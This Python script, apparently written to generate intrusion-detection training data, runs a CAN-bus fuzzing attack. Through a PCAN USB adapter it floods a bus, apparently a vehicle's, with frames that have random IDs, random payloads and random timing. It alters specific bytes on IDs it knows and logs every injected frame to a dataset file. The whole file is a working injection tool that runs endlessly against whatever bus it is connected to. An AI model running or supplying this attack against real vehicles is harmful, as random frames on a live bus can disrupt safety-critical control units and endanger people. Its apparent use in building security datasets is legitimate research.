from PCANBasic import *
import time
import random
import datetime
import os

unused_bits = {'0165': [3, '00'], '051A': [0, '00'], '02B0': [3, '07'], '00A0': [6, '00'],
 '05E4': [0, '00'], '0153': [4, '00'], '02A0': [1, '00'], '0120': [0, '00'], '043F': [2, '60'],
 '0316': [7, '7F'], '04B1': [4, '00'], '0050': [0, '00'], '0164': [0, '00'], '0018': [6, '20'],
 '0044': [0, '00'], '0110': [0, 'E0'], '05F0': [0, '00'], '0329': [7, '10'], '0440': [3, '00'],
 '00A1': [2, '80'], '04F2': [4, '00'], '018F': [6, '00'], '0382': [0, '40'], '04F0': [0, '00'],
 '05A2': [0, '25'], '0034': [0, '00'], '0260': [3, '30'], '01F1': [0, '00'], '02C0': [0, '3D'],
 '0517': [1, '00'], '05A0': [0, '00'], '0080': [1, '17'], '0043': [0, '00'],
 '0350': [5, '00'], '059B': [0, '00'], '0081': [3, '00'], '0042': [1, 'FF'], '0510': [0, '00'],
 '0690': [0, '03'], '0587': [0, '00'], '0370': [0, 'FF']}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

x = datetime.datetime.now()
x = "Dataset\\Fuzzing Attack Injected Datas " + str(x).split()[0] + "-"
ind = 0

while os.path.isfile( x + str(ind) + ".txt"):
    ind += 1
    print("Yes")

print("No")
x = x + str(ind) + ".txt"
f = open(x, "a")




def Fuzzing_Attack(id, leng, data):
    all_datas = ""
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(id, 16)
    Fuzzing_attack.LEN = leng
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(Fuzzing_attack.LEN)

    if id in unused_bits:
        check_ind = unused_bits[id][0]
        check_val = unused_bits[id][1]
    else:
        check_ind = 123
        check_val = 123
    
    for i in range(leng):
        if check_ind == i and check_val == data[i]:            
            Fuzzing_attack.DATA[i] = int(data[i], 16) + 3
            all_datas += "\t" + bcolors.OKGREEN + str(hex(Fuzzing_attack.DATA[i])) + bcolors.ENDC
        else:
            Fuzzing_attack.DATA[i] = int(data[i], 16)
            all_datas += "\t" + str(hex(Fuzzing_attack.DATA[i]))
    
    CAN.Write(CAN_BUS, Fuzzing_attack)
    print(all_datas)
    all_datas += "\n"
    f.write(all_datas)

if __name__ == "__main__":
    CAN = PCANBasic()                            #CANi
    CAN_BUS = PCAN_USBBUS6
    counter = 0    
    start_time = time.time()
    ind = 0
    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    id_exist = False
    if result != PCAN_ERROR_OK:
        # An error occurred, get a text describing the error and show it
        #
        print("oh No")
        CAN.GetErrorText(result)
        print(result)
    while True:
        time_offset = random.randrange(1, 50) / 1000
        injection_id = hex(random.randrange(0, 1024))
        injection_id = injection_id.split("x")[1]
        for _ in range(4 - len(injection_id)):
            injection_id = '0' + injection_id.upper()
        # injection_id = random.choice(list(unused_bits.keys()))
        print(bcolors.OKBLUE + str(injection_id) + bcolors.ENDC)
        attack_data = []

        if injection_id in unused_bits:
            leng = 8
            id_exist = True
        else:
            leng = random.randrange(2, 8)
        
        for i in range(leng):
            if id_exist and i == unused_bits[injection_id][0]:
                attack_data.append(unused_bits[injection_id][1])
            else:
                attack_data.append(hex(random.randrange(0, 255)))
        id_exist = False
        Fuzzing_Attack(injection_id, leng, attack_data)
        time.sleep(time_offset)